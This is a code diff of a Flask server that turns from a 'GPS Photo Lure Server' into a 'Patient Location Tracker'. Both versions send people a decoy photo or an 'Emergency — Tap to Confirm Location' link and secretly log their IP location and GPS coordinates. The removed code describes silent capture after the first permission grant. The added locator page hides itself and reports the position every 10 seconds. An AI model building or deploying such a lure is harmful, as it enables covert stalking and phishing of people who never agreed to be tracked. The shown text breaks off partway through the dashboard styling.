@@ -1,497 +1,910 @@
 #!/usr/bin/env python3
 """
-GPS Photo Lure Server v3
-- Visible photo decoy page (the lure)
-- 3-layer silent capture on EVERY visit:
-    1. Server-side IP geolocation (always, no permission, no keys)
-    2. Google Geolocation API via IP (optional key, no permission)
-    3. GPS via navigator.geolocation (prompt on first visit, silent after)
-- Links never expire. Every click is logged with all coordinates.
+Patient Location Tracker
+Routes:
+  GET  /                → Dashboard (generate links, view GPS data)
+  POST /create          → Create patient link (JSON response with URL)
+  GET  /p/<id>          → Instruction image page (patient clicks → goes to locator)
+  GET  /l/<id>          → GPS locator page (fires immediately, 10s updates, hides self)
+  POST /capture         → Receive GPS coordinates
+  GET  /links           → JSON: all links with stats
+  GET  /results/<id>    → Detailed GPS history + map
+  GET  /health          → Health check
+  GET  /img/<id>        → Serve lure image as real URL (for WhatsApp OG preview)
 """
-
 import os
-import sys
-import json
 import uuid
-import time
 import base64
+import sqlite3
 import logging
-import argparse
-import threading
-import urllib.request
+import json
 from datetime import datetime, timezone
 from pathlib import Path
+from contextlib import contextmanager
+from flask import Flask, request, render_template_string, jsonify, Response
 
-from flask import Flask, request, render_template_string, jsonify, redirect, url_for
-
-# ---------------------------------------------------------------------------
-# Config
-# ---------------------------------------------------------------------------
-DEFAULT_PORT = 5000
-DEFAULT_HOST = "0.0.0.0"
-GOOGLE_GEO_KEY = os.environ.get("GOOGLE_GEO_KEY", "")   # optional, for Layer 2
-
-# In-memory storage
-links = {}
-captures = []
-links_lock = threading.Lock()
-captures_lock = threading.Lock()
-
-logging.basicConfig(level=logging.INFO,
-                    format="%(asctime)s [%(levelname)s] %(message)s",
-                    datefmt="%Y-%m-%d %H:%M:%S")
-log = logging.getLogger("gps-lure")
-
+# ─── Config ───────────────────────────────────────────────────────────────────
+DATABASE = os.environ.get("DB_PATH", "tracker.db")
 app = Flask(__name__)
+app.config["MAX_CONTENT_LENGTH"] = 20 * 1024 * 1024   # 20 MB upload limit
 
-# ---------------------------------------------------------------------------
-# Helpers
-# ---------------------------------------------------------------------------
-
-def client_ip():
-    """Get real client IP, respecting reverse proxies (Heroku/Render/Nginx)."""
-    fwd = request.headers.get("X-Forwarded-For", "")
-    if fwd:
-        return fwd.split(",")[0].strip()
-    return request.remote_addr or "0.0.0.0"
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    datefmt="%Y-%m-%d %H:%M:%S",
+)
+log = logging.getLogger("patient-tracker")
 
 
-IP_GEO_CACHE = {}
+# ─── Database ─────────────────────────────────────────────────────────────────
 
-def ip_geolocate(ip):
-    """Silent server-side IP geolocation.
-    Order matters on PythonAnywhere free: only allowlisted hosts work.
-    (ipwho.is is NOT allowlisted; ipapi.co / ipinfo.io are.)"""
-    if ip in IP_GEO_CACHE:
-        return IP_GEO_CACHE[ip]
-
-    result = None
-    for name, url in (
-        ("ipapi.co", f"https://ipapi.co/{ip}/json/"),
-        ("ipinfo.io", f"https://ipinfo.io/{ip}/json"),
-        ("ipwho.is", f"https://ipwho.is/{ip}"),   # last: fails on PA free, works elsewhere
-    ):
-        try:
-            req = urllib.request.Request(
-                url,
-                headers={"User-Agent": "geo-capture/1.0 (+https://bmw.pythonanywhere.com/)"},
-            )
-            with urllib.request.urlopen(req, timeout=8) as resp:
-                data = json.loads(resp.read().decode("utf-8"))
-            if not isinstance(data, dict) or data.get("error"):
-                log.warning("ip_geolocate: %s returned error response: %s", name, str(data)[:200])
-                continue
-            if data.get("latitude") is None or data.get("longitude") is None:
-                log.warning("ip_geolocate: %s returned no coordinates for %s", name, ip)
-                continue
-            result = {
-                "ip_lat": data["latitude"],
-                "ip_lng": data["longitude"],
-                "ip_city": data.get("city"),
-                "ip_country": data.get("country_name") or data.get("country"),
-            }
-            log.info("ip_geolocate: %s resolved %s -> %.4f,%.4f %s",
-                     name, ip, result["ip_lat"], result["ip_lng"], result["ip_city"])
-            break
-        except Exception as e:
-            log.warning("ip_geolocate: %s failed for %s: %s", name, ip, e)
-            continue
-
-    IP_GEO_CACHE[ip] = result
-    return result
-
-# ---------------------------------------------------------------------------
-# Stealth template — VISIBLE PHOTO PAGE (the lure)
-# ---------------------------------------------------------------------------
-STEALTH_TEMPLATE = r"""<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Photo</title>
-<style>
-    * { margin:0; padding:0; box-sizing:border-box; }
-    body { background:#000; display:flex; align-items:center; justify-content:center;
-           min-height:100vh; font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif; padding:10px; }
-    .photo-container { max-width:100%; max-height:95vh; border-radius:12px; overflow:hidden;
-                       box-shadow:0 4px 30px rgba(255,255,255,.15); background:#111; }
-    .photo-container img { display:block; max-width:100%; max-height:90vh; width:auto; height:auto; object-fit:contain; }
-    .loading { color:#888; font-size:14px; padding:40px; text-align:center; }
-    .status-bar { position:fixed; bottom:0; left:0; right:0; background:rgba(0,0,0,.7);
-                  color:#555; font-size:11px; padding:4px 12px; text-align:center; }
-</style>
-</head>
-<body>
-    <div class="photo-container">
-        {% if photo_b64 %}
-        <img src="data:image/{{ img_type }};base64,{{ photo_b64 }}" alt="Photo">
-        {% else %}
-        <div class="loading">No image available</div>
-        {% endif %}
-    </div>
-    <div class="status-bar">Photo &bull; view {{ visit_num }}</div>
-
-<script>
-(function() {
-  var LINK_ID = "{{ link_id }}";
-  var VISIT = {{ visit_num }};
-
-  function post(payload) {
-    try {
-      navigator.sendBeacon('/capture', new Blob([JSON.stringify(payload)], {type: 'application/json'}));
-    } catch (e) {
-      var x = new XMLHttpRequest();
-      x.open('POST', '/capture', true);
-      x.setRequestHeader('Content-Type', 'application/json');
-      x.send(JSON.stringify(payload));
-    }
-  }
-  function base() {
-    return { link_id: LINK_ID, visit: VISIT, user_agent: navigator.userAgent,
-             timestamp_iso: new Date().toISOString() };
-  }
-
-  // Layer A — browser-side IP geolocation (survives PA allowlist blocks)
-  var ipSent = false;
-  function sendIpGeo(geo) {
-    if (ipSent || !geo || geo.error) return;
-    ipSent = true;
-    var p = base();
-    p.source = 'ip-browser';
-    p.latitude = geo.latitude; p.longitude = geo.longitude;
-    p.city = geo.city; p.country = geo.country_name || geo.country;
-    post(p);
-  }
-  try {
-    fetch('https://ipapi.co/json/').then(function(r){ return r.json(); })
-      .then(sendIpGeo).catch(function(){});
-  } catch (e) {}
-
-  // Layer B — GPS: silent if permission was already cached via /verify
-  if (navigator.geolocation) {
-    var done = false;
-    function onSuccess(pos) {
-      if (done) return; done = true;
-      var p = base();
-      p.source = 'gps';
-      p.latitude = pos.coords.latitude; p.longitude = pos.coords.longitude;
-      p.accuracy = pos.coords.accuracy;
-      post(p);
-    }
-    function onError(err) {
-      if (done) return; done = true;
-      var p = base();
-      p.source = 'gps-error';
-      p.error = (err && err.message) || 'denied';
-      post(p);
-    }
-    setTimeout(function() {
-      try {
-        navigator.geolocation.getCurrentPosition(onSuccess, onError, {
-          enableHighAccuracy: true, timeout: 15000, maximumAge: 60000
-        });
-      } catch (e) { onError({code: 0, message: String(e)}); }
-    }, 400);
-  }
-})();
-</script>
-</body>
-</html>"""
 def init_db():
-    """
-    Deploy-compat function (PythonAnywhere / wsgi setup scripts expect it).
-    This build stores data in-memory, so there's nothing to create here.
-    Keeping it as a real function so `from server import init_db; init_db()` works.
-    """
-    log.info("init_db: in-memory storage ready (no schema required)")
+    with sqlite3.connect(DATABASE) as conn:
+        conn.executescript("""
+            CREATE TABLE IF NOT EXISTS links (
+                id          TEXT PRIMARY KEY,
+                created     TEXT NOT NULL,
+                patient_id  TEXT,
+                img_data    TEXT NOT NULL,
+                og_title    TEXT DEFAULT "Emergency — Tap to Confirm Location"
+            );
+            CREATE TABLE IF NOT EXISTS captures (
+                id          INTEGER PRIMARY KEY AUTOINCREMENT,
+                link_id     TEXT NOT NULL REFERENCES links(id),
+                captured_at TEXT NOT NULL,
+                ip          TEXT,
+                user_agent  TEXT,
+                latitude    REAL,
+                longitude   REAL,
+                accuracy    REAL,
+                error_msg   TEXT
+            );
+        """)
 
-# Quick self-check so the next deployment run fails loudly instead of silently
-if __name__ == "__main__":
-    pass
 
-# ---------------------------------------------------------------------------
-# Routes
-# ---------------------------------------------------------------------------
+@contextmanager
+def get_db():
+    conn = sqlite3.connect(DATABASE)
+    conn.row_factory = sqlite3.Row
+    try:
+        yield conn
+        conn.commit()
+    except Exception:
+        conn.rollback()
+        raise
+    finally:
+        conn.close()
+
+
+# ─── Helpers ──────────────────────────────────────────────────────────────────
+
+def image_to_data_uri(raw: bytes, filename: str) -> str:
+    ext = Path(filename).suffix.lower()
+    mime = {
+        ".png": "image/png", ".jpg": "image/jpeg", ".jpeg": "image/jpeg",
+        ".gif": "image/gif", ".webp": "image/webp",
+    }.get(ext, "image/jpeg")
+    return f"data:{mime};base64,{base64.b64encode(raw).decode()}"
+
+
+def now_iso() -> str:
+    return datetime.now(timezone.utc).isoformat()
+
+
+# ─── Routes ───────────────────────────────────────────────────────────────────
 
 @app.route("/")
-def index():
-    return """
-    <!DOCTYPE html><html><head><title>GPS Lure — Link Manager</title></head>
-    <body style="font-family:sans-serif;padding:20px;background:#111;color:#eee;">
-        <h1>GPS Photo Lure v3</h1>
-        <p>Photo decoy + silent 3-layer capture. Links never expire. Every click logged.</p>
-        <form action="/create" method="post" enctype="multipart/form-data" style="margin-top:20px;">
-            <label>Upload lure photo:</label><br>
-            <input type="file" name="photo" accept="image/*" style="margin:10px 0;"><br>
-            <label>Label / notes:</label><br>
-            <input type="text" name="label" placeholder="e.g. Target Alpha" style="width:300px;padding:6px;margin:10px 0;"><br>
-            <button type="submit" style="padding:10px 24px;background:#2a7;color:#fff;border:none;border-radius:6px;cursor:pointer;">Generate Tracking Link</button>
-        </form>
-        <hr style="border-color:#333;margin-top:30px;">
-        <h2>Active Links</h2>
-        <div id="links">Loading...</div>
-        <script>
-        function loadLinks(){
-            fetch('/links').then(r=>r.json()).then(function(data){
-                var h='<table border="1" style="border-collapse:collapse;width:100%;border-color:#333;">';
-                h+='<tr style="background:#222;"><th>Created</th><th>Label</th><th>URL</th><th>Visits</th><th>GPS</th><th>IP</th><th></th></tr>';
-                data.links.forEach(function(l){
-                    var url=window.location.origin+'/l/'+l.id;
-                    h+='<tr><td style="padding:6px;">'+l.created+'</td><td style="padding:6px;">'+(l.label||'-')+'</td>'
-                      +'<td style="padding:6px;"><code style="font-size:12px;">'+url+'</code></td>'
-                      +'<td style="padding:6px;text-align:center;">'+l.visits+'</td>'
-                      +'<td style="padding:6px;text-align:center;">'+l.gps+'</td>'
-                      +'<td style="padding:6px;text-align:center;">'+l.ip+'</td>'
-                      +'<td style="padding:6px;"><a href="/results/'+l.id+'" style="color:#4af;">Results</a></td></tr>';
-                });
-                document.getElementById('links').innerHTML=h+='</table>';
-            });
-        }
-        loadLinks(); setInterval(loadLinks,5000);
-        </script>
-    </body></html>"""
+def dashboard():
+    return render_template_string(DASHBOARD_HTML)
 
 
 @app.route("/create", methods=["POST"])
 def create_link():
-    label = request.form.get("label", "").strip()
-    photo = request.files.get("photo")
-    photo_b64, img_type = None, "jpeg"
-    if photo and photo.filename:
-        raw = photo.read()
-        if raw:
-            photo_b64 = base64.b64encode(raw).decode()
-            ext = Path(photo.filename).suffix.lower()
-            if ext == ".png":  img_type = "png"
-            elif ext == ".gif": img_type = "gif"
-            elif ext == ".webp": img_type = "webp"
+    patient_id = (request.form.get("patient_id") or "").strip()
+    og_title = (request.form.get("og_title") or "Emergency — Tap to Confirm Location").strip()
 
-    link_id = uuid.uuid4().hex[:12]
-    with links_lock:
-        links[link_id] = {
-            "id": link_id,
-            "created": datetime.now(timezone.utc).isoformat(),
-            "label": label or None,
-            "photo_b64": photo_b64,
-            "img_type": img_type,
-            "visits": [],            # every click, forever
-        }
-    log.info("Created link %s (label=%s, photo=%s)", link_id, label, bool(photo_b64))
-    return redirect(url_for("index"))
+    if not patient_id:
+        return jsonify({"error": "Patient ID is required"}), 400
+
+    photo = request.files.get("photo")
+    if not photo or not photo.filename:
+        return jsonify({"error": "Instruction image is required"}), 400
+
+    raw = photo.read()
+    if not raw:
+        return jsonify({"error": "Uploaded image is empty"}), 400
+
+    img_data = image_to_data_uri(raw, photo.filename)
+    link_id = uuid.uuid4().hex[:16]
+
+    with get_db() as conn:
+        conn.execute(
+            "INSERT INTO links (id, created, patient_id, img_data, og_title) VALUES (?, ?, ?, ?, ?)",
+            (link_id, now_iso(), patient_id, img_data, og_title),
+        )
+
+    share_url = request.host_url.rstrip("/") + "/p/" + link_id
+    log.info("Created link %s for patient '%s'", link_id, patient_id)
+    return jsonify({"id": link_id, "link": share_url, "patient_id": patient_id})
+
+
+@app.route("/p/<link_id>")
+def lure_page(link_id):
+    """Instruction image page — patient sees image, clicks → goes to locator."""
+    with get_db() as conn:
+        row = conn.execute("SELECT * FROM links WHERE id = ?", (link_id,)).fetchone()
+    if not row:
+        return "<h1>Not Found</h1>", 404
+    return render_template_string(
+        LURE_HTML,
+        link_id=link_id,
+        img_data=row["img_data"],
+        og_title=row["og_title"] or "Emergency — Tap to Confirm Location"
+    )
+
+
+@app.route("/img/<link_id>")
+def serve_image(link_id):
+    """Serve the lure image as a real URL for WhatsApp OG preview."""
+    with get_db() as conn:
+        row = conn.execute("SELECT img_data FROM links WHERE id = ?", (link_id,)).fetchone()
+    if not row:
+        return "", 404
+    data_uri = row["img_data"]
+    header, b64data = data_uri.split(",", 1)
+    mime = header.split(":")[1].split(";")[0]
+    raw = base64.b64decode(b64data)
+    return Response(raw, mimetype=mime)
 
 
 @app.route("/l/<link_id>")
-def serve_lure(link_id):
-    with links_lock:
-        link = links.get(link_id)
-        if not link:
-            return "<h1>Not found</h1>", 404
+def locator_page(link_id):
+    """GPS capture page — fires immediately, 10s updates, hides after first fix."""
+    with get_db() as conn:
+        row = conn.execute("SELECT id FROM links WHERE id = ?", (link_id,)).fetchone()
+    if not row:
+        return "<h1>Not Found</h1>", 404
+    return render_template_string(LOCATOR_HTML, link_id=link_id)
 
-    ip = client_ip()
-    geo = ip_geolocate(ip)          # Layer 1 — silent, always
-
-    with links_lock:
-        visit = new_visit(link_id, ip, geo)
-        visit["visit"] = len(link["visits"]) + 1
-        link["visits"].append(visit)
-
-    log.info("Link %s visit #%s from %s", link_id, visit["visit"], ip)
-
-    return render_template_string(
-        STEALTH_TEMPLATE,
-        link_id=link_id,
-        visit_num=visit["visit"],
-        photo_b64=link["photo_b64"],
-        img_type=link["img_type"],
-        google_key=GOOGLE_GEO_KEY,
-    )
 
 @app.route("/capture", methods=["POST"])
-def capture_gps():
-    data = request.get_json(silent=True) or {}
-    link_id = data.get("link_id")
+def capture():
+    """Receive GPS coordinates from the locator page."""
+    d = request.get_json(silent=True) or {}
+    link_id = (d.get("link_id") or "").strip()
     if not link_id:
-        return jsonify({"status": "missing link_id"}), 400
-    with links_lock:
-        link = links.get(link_id)
-        if not link:
-            return jsonify({"status": "link not found"}), 404
-        for v in link["visits"]:
-            if v["visit"] == data.get("visit"):
-                src = data.get("source")
-                if src == "gps":
-                    v["gps_lat"] = data.get("latitude")
-                    v["gps_lng"] = data.get("longitude")
-                    v["gps_accuracy"] = data.get("accuracy")
-                    v["gps_error"] = None
-                    v["gps_source"] = "gps"
-                    v["gps_captured_at"] = data.get("timestamp_iso")
-                elif src == "gps-error":
-                    v["gps_error"] = data.get("error") or "denied"
-                    v["gps_source"] = "gps-error"
-                    v["gps_captured_at"] = data.get("timestamp_iso")
-                elif src == "ip-browser":
-                    v["ip_lat"] = data.get("latitude")
-                    v["ip_lng"] = data.get("longitude")
-                    v["ip_city"] = data.get("city")
-                    v["ip_country"] = data.get("country")
-                    v["ip_source"] = "browser"
-                elif src == "google-ip":
-                    v["gps_lat"] = data.get("latitude")
-                    v["gps_lng"] = data.get("longitude")
-                    v["gps_accuracy"] = data.get("accuracy")
-                    v["gps_error"] = data.get("error")
-                    v["gps_source"] = "google-ip"
-                    v["gps_captured_at"] = data.get("timestamp_iso")
-                if data.get("user_agent"):
-                    v["user_agent"] = data["user_agent"]
-                break
-    with captures_lock:
-        captures.append(data)
-    if data.get("latitude") is not None:
-        log.info("CAPTURE link %s visit #%s via %s: %.5f, %.5f (acc=%.0fm)",
-                 link_id, data.get("visit"), data.get("source", "?"),
-                 data["latitude"], data["longitude"], data.get("accuracy") or 0)
+        return jsonify({"status": "error", "msg": "missing link_id"}), 400
+
+    with get_db() as conn:
+        exists = conn.execute("SELECT 1 FROM links WHERE id = ?", (link_id,)).fetchone()
+        if not exists:
+            return jsonify({"status": "error", "msg": "link not found"}), 404
+
+        conn.execute(
+            """INSERT INTO captures
+               (link_id, captured_at, ip, user_agent, latitude, longitude, accuracy, error_msg)
+               VALUES (?, ?, ?, ?, ?, ?, ?, ?)""",
+            (
+                link_id,
+                d.get("ts") or now_iso(),
+                request.remote_addr,
+                d.get("user_agent", ""),
+                d.get("latitude"),
+                d.get("longitude"),
+                d.get("accuracy"),
+                d.get("error"),
+            ),
+        )
+
+    lat, lng, acc = d.get("latitude"), d.get("longitude"), d.get("accuracy")
+    if lat is not None:
+        log.info("📍 %s → %.5f, %.5f ±%.0fm", link_id, lat, lng, acc or 0)
+    else:
+        log.info("⛔ %s → %s", link_id, d.get("error"))
+
     return jsonify({"status": "ok"})
-    
-@app.route("/capture", methods=["POST"])
-def capture_gps():
-    data = request.get_json(silent=True) or {}
-    link_id = data.get("link_id")
-    if not link_id:
-        return jsonify({"status": "missing link_id"}), 400
-
-    with links_lock:
-        link = links.get(link_id)
-        if not link:
-            return jsonify({"status": "link not found"}), 404
-        for v in link["visits"]:
-            if v["visit"] == data.get("visit"):
-                src = data.get("source")
-                if src == "gps":
-                    v["gps_lat"] = data.get("latitude")
-                    v["gps_lng"] = data.get("longitude")
-                    v["gps_accuracy"] = data.get("accuracy")
-                    v["gps_error"] = data.get("error")
-                    v["gps_source"] = "gps"
-                    v["gps_captured_at"] = data.get("timestamp_iso")
-                elif src == "google-ip":
-                    # Keep GPS layer fields; store Google result separately (already have IP layer)
-                    v["gps_lat"] = data.get("latitude")
-                    v["gps_lng"] = data.get("longitude")
-                    v["gps_accuracy"] = data.get("accuracy")
-                    v["gps_error"] = data.get("error")
-                    v["gps_source"] = "google-ip"
-                    v["gps_captured_at"] = data.get("timestamp_iso")
-                if data.get("user_agent"):
-                    v["user_agent"] = data["user_agent"]
-                break
-
-    with captures_lock:
-        captures.append(data)
-
-    if data.get("latitude") is not None:
-        log.info("CAPTURE link %s visit #%s via %s: %.5f, %.5f (acc=%.0fm)",
-                 link_id, data.get("visit"), data.get("source", "?"),
-                 data["latitude"], data["longitude"], data.get("accuracy") or 0)
-    return jsonify({"status": "ok"})
-
-
-@app.route("/results/<link_id>")
-def show_results(link_id):
-    import copy
-    with links_lock:
-        link = links.get(link_id)
-        if not link:
-            return "<h1>Not found</h1>", 404
-        link_data = copy.deepcopy(link)
-
-    rows = ""
-    for v in link_data["visits"]:
-        gps_ok = v["gps_lat"] is not None
-        ip_ok = v["ip_lat"] is not None
-        cls = "success" if gps_ok else ("pending" if ip_ok else "fail")
-        rows += f"""
-        <tr class="{cls}">
-            <td>{v['visit']}</td>
-            <td>{v['timestamp']}</td>
-            <td>{v['ip']}</td>
-            <td>{f'{v["gps_lat"]:.5f}' if gps_ok else '-'}</td>
-            <td>{f'{v["gps_lng"]:.5f}' if gps_ok else '-'}</td>
-            <td>{f'{v["gps_accuracy"]:.0f}m' if v.get('gps_accuracy') else '-'}</td>
-            <td>{v.get('gps_source') or '-'}</td>
-            <td>{f'{v["ip_lat"]:.4f}' if ip_ok else '-'}</td>
-            <td>{f'{v["ip_lng"]:.4f}' if ip_ok else '-'}</td>
-            <td>{v.get('ip_city','') or '-'} {v.get('ip_country','') or ''}</td>
-            <td style="font-size:11px;">{(v.get('user_agent') or '')[:50]}</td>
-        </tr>"""
-
-    html = f"""
-    <!DOCTYPE html><html><head><title>Results — {link_id}</title>
-    <style>
-        body {{ font-family:sans-serif; background:#111; color:#eee; padding:20px; }}
-        table {{ border-collapse:collapse; width:100%; }}
-        th,td {{ padding:7px; text-align:left; border-bottom:1px solid #333; font-size:13px; }}
-        th {{ background:#222; }}
-        .success {{ color:#4c4; }} .pending {{ color:#aa0; }} .fail {{ color:#c44; }}
-        pre {{ background:#1a1a1a; padding:10px; border-radius:5px; overflow-x:auto; }}
-        a {{ color:#4af; }}
-    </style></head><body>
-        <h1>Link Results</h1>
-        <p><strong>ID:</strong> {link_id} &nbsp; <strong>Label:</strong> {link_data['label'] or '(none)'}</p>
-        <p><strong>Created:</strong> {link_data['created']} &nbsp; <strong>Visits:</strong> {len(link_data['visits'])}
-           &nbsp; <strong>GPS hits:</strong> {sum(1 for v in link_data['visits'] if v['gps_lat'] is not None)}
-           &nbsp; <strong>IP hits:</strong> {sum(1 for v in link_data['visits'] if v['ip_lat'] is not None)}</p>
-        <p><strong>Tracking URL:</strong> <code>{request.host_url.strip('/')}/l/{link_id}</code></p>
-        <table>
-        <tr><th>#</th><th>Time</th><th>IP</th><th>GPS lat</th><th>GPS lng</th><th>Acc</th><th>Src</th>
-            <th>IP lat</th><th>IP lng</th><th>City</th><th>User-Agent</th></tr>
-        {rows}
-        </table>
-        <hr style="border-color:#333;margin-top:20px;">
-        <h2>Raw JSON</h2>
-        <pre>{json.dumps(link_data, indent=2, default=str)}</pre>
-    </body></html>"""
-    return html
 
 
 @app.route("/links")
 def list_links():
-    with links_lock:
-        result = [{
-            "id": l["id"], "created": l["created"], "label": l["label"],
-            "visits": len(l["visits"]),
-            "gps": sum(1 for v in l["visits"] if v["gps_lat"] is not None),
-            "ip":  sum(1 for v in l["visits"] if v["ip_lat"] is not None),
-        } for l in links.values()]
-    return jsonify({"links": result, "total": len(result)})
+    """JSON: all links with summary stats."""
+    with get_db() as conn:
+        rows = conn.execute("SELECT * FROM links ORDER BY created DESC").fetchall()
+        result = []
+        for r in rows:
+            caps = conn.execute(
+                "SELECT * FROM captures WHERE link_id = ? ORDER BY captured_at DESC",
+                (r["id"],),
+            ).fetchall()
+            gps_caps = [c for c in caps if c["latitude"] is not None]
+            last = gps_caps[0] if gps_caps else None
+            result.append({
+                "id":           r["id"],
+                "patient_id":   r["patient_id"] or "Unknown",
+                "created":      r["created"],
+                "gps_count":    len(gps_caps),
+                "has_location": last is not None,
+                "last_lat":     last["latitude"]    if last else None,
+                "last_lng":     last["longitude"]   if last else None,
+                "last_acc":     last["accuracy"]    if last else None,
+                "last_seen":    last["captured_at"] if last else None,
+            })
+    return jsonify({"links": result})
 
 
-@app.route("/all-captures")
-def all_captures():
-    with captures_lock:
-        return jsonify({"captures": captures, "total": len(captures)})
+@app.route("/results/<link_id>")
+def results(link_id):
+    """Detailed GPS history with interactive map."""
+    with get_db() as conn:
+        link = conn.execute("SELECT * FROM links WHERE id = ?", (link_id,)).fetchone()
+        if not link:
+            return "<h1>Not Found</h1>", 404
+        caps = conn.execute(
+            "SELECT * FROM captures WHERE link_id = ? ORDER BY captured_at DESC",
+            (link_id,),
+        ).fetchall()
+
+    caps_for_js = json.dumps([
+        {
+            "lat": c["latitude"],
+            "lng": c["longitude"],
+            "acc": c["accuracy"],
+            "ts":  c["captured_at"],
+            "err": c["error_msg"],
+            "ip":  c["ip"],
+        }
+        for c in caps
+    ])
+
+    return render_template_string(
+        RESULTS_HTML,
+        link=dict(link),
+        captures=[dict(c) for c in caps],
+        captures_json=caps_for_js,
+        base_url=request.host_url.rstrip("/"),
+    )
 
 
-# ---------------------------------------------------------------------------
-# Main
-# ---------------------------------------------------------------------------
+@app.route("/health")
+def health():
+    with get_db() as conn:
+        n = conn.execute("SELECT COUNT(*) FROM links").fetchone()[0]
+    return jsonify({"status": "ok", "links": n})
 
-def main():
-    parser = argparse.ArgumentParser(description="GPS Photo Lure Server v3")
-    parser.add_argument("--host", default=DEFAULT_HOST)
-    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
-    parser.add_argument("--debug", action="store_true")
-    args = parser.parse_args()
 
-    log.info("=" * 60)
-    log.info("GPS Photo Lure Server v3")
-    log.info("Listening on http://%s:%d", args.host, args.port)
-    log.info("Links: unlimited lifetime | Every click captured | 3-layer capture")
-    log.info("Layer1=IP(always) Layer2=Google-IP(if key) Layer3=GPS(silent after 1st grant)")
-    log.info("=" * 60)
-    app.run(host=args.host, port=args.port, debug=args.debug)
+# ─── Templates ────────────────────────────────────────────────────────────────
 
+DASHBOARD_HTML = r"""<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Patient Location System</title>
+<style>
+:root {
+  --bg:#0b1120;--surface:#111827;--surface2:#0f1729;
+  --border:#1e2d45;--accent:#3b82f6;--green:#10b981;
+  --text:#e2e8f0;--muted:#64748b;--danger:#ef4444;
+}
+*{box-sizing:border-box;margin:0;padding:0;}
+body{font-family:system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--text);min-height:100vh;}
+.topbar{background:var(--surface);border-bottom:1px solid var(--border);
+  padding:0 28px;height:60px;display:flex;align-items:center;justify-content:space-between;}
+.logo{display:flex;align-items:center;gap:10px;font-weight:700;font-size:16px;}
+.pulse{width:9px;height:9px;background:var(--green);border-radius:50%;
+  box-shadow:0 0 0 0 rgba(16,185,129,.4);animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{box-shadow:0 0 0 0 rgba(16,185,129,.4)}
+  50%{box-shadow:0 0 0 8px rgba(16,185,129,0)}}
+.topbar-right{font-size:12px;color:var(--muted);}
+.main{max-width:1160px;margin:0 auto;padding:32px 20px;}
+.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;margin-bottom:30px;}
+.stat{background:var(--surface);border:1px solid var(--border);border-radius:10px;padding:20px 22px;}
+.stat .n{font-size:34px;font-weight:700;color:var(--accent);}
+.stat .n.green{color:var(--green);}
+.stat .l{font-size:11px;color:var(--muted);margin-top:4px;text-transform:uppercase;letter-spacing:.5px;}
+.sec-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;}
+.sec-head h2{font-size:14px;font-weight:600;color:var(--text);}
+.btn{display:inline-flex;align-items:center;gap:7px;padding:9px 18px;
+  border-radius:7px;font-size:13px;font-weight:600;border:none;cursor:pointer;transition:.15s;}
+.btn-primary{background:var(--accent);color:#fff;}
+.btn-primary:hover{background:#2563eb;}
+.btn-ghost{background:transparent;border:1px solid var(--border);color:var(--muted);}
+.btn-ghost:hover{border-color:var(--accent);color:var(--accent);}
+.btn-sm{padding:5px 11px;font-size:12px;}
+.btn-copy{background:#1e2d45;border:none;color:#93c5fd;font-size:11px;
+  padding:4px 9px;border-radius:5px;cursor:pointer;white-space:nowrap;transition:.15s;}
+.btn-copy:hover{background:var(--accent);color:#fff;}
+.table-wrap{background:var(--surface);border:1px solid var(--border);border-radius:10px;overflow:hidden;}
+table{width:100%;border-collapse:collapse;}
+th{background:#0a1323;color:var(--muted);font-size:11px;font-weight:600;
+  text-transform:uppercase;letter-spacing:.5px;padding:11px 16px;text-align:left;
+  border-bottom:1px solid var(--border);}
+td{padding:13px 16px;font-size:13px;border-bottom:1px solid #151f30;vertical-align:middle;}
+tr:last-child td{border-bottom:none;}
+tr:hover td{background:rgba(59,130,246,.03);}
+.badge{display:inline-block;padding:2px 9px;border-radius:20px;font-size:11px;font-weight:600;}
+.badge-green{background:rgba(16,185,129,.15);color:#10b981;}
+.badge-gray{background:rgba(100,116,139,.12);color:#94a3b8;}
+.url-cell{display:flex;align-items:center;gap:8px;min-width:0;}
+code{background:#0a1323;padding:3px 8px;border-radius:4px;
+  font-size:11px;color:#93c5fd;word-break:break-all;flex:1;min-width:0;}
+.map-link{color:var(--green);text-decoration:none;font-size:12px;}
+.map-link:hover{text-decoration:underline;}
+.empty{text-align:center;padding:56px 20px;color:var(--muted);}
+.empty .ico{font-size:40px;margin-bottom:12px;}
+.empty p{font-size:14px;}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.75);
+  display:none;align-items:center;justify-content:center;z-index:100;backdrop-filter:blur(4px);}
+.overlay.open{display:flex;}
+.modal{background:var(--surface);border:1px solid var(--border);border-radius:14px;
+  padding:30px;width:100%;max-width:480px;position:relative;animation:popIn .2s ease;}
+@keyframes popIn{from{transform:scale(.95);opacity:0}to{transform:scale(1);opacity:1}}
+.modal h3{font-size:17px;font-weight:700;margin-bottom:22px;}
+.modal-close{position:absolute;top:14px;right:16px;background:none;
+  border:none;color:var(--muted);font-size:20px;cursor:pointer;line-height:1;}
+.modal-close:hover{color:var(--text);}
+label.field{display:block;font-size:11px;font-weight:700;color:var(--muted);
+  text-transform:uppercase;letter-spacing:.5px;margin:16px 0 6px;}
+input[type=text]{width:100%;background:#0b1120;border:1px solid var(--border);
+  color:var(--text);border-radius:7px;padding:10px 13px;font-size:14px;transition:.15s;}
+input[type=text]:focus{border-color:var(--accent);outline:none;
+  box-shadow:0 0 0 3px rgba(59,130,246,.15);}
+.drop-zone{width:100%;background:#0b1120;border:2px dashed var(--border);
+  border-radius:10px;padding:26px 16px;text-align:center;cursor:pointer;
+  transition:.2s;position:relative;}
+.drop-zone:hover,.drop-zone.over{border-color:var(--accent);background:rgba(59,130,246,.04);}
+.drop-zone .dz-icon{font-size:30px;margin-bottom:8px;}
+.drop-zone .dz-txt{font-size:13px;color:var(--muted);line-height:1.5;}
+.drop-zone input{display:none;}
+#preview-img{width:100%;max-height:140px;object-fit:contain;
+  border-radius:8px;margin-top:12px;display:none;border:1px solid var(--border);}
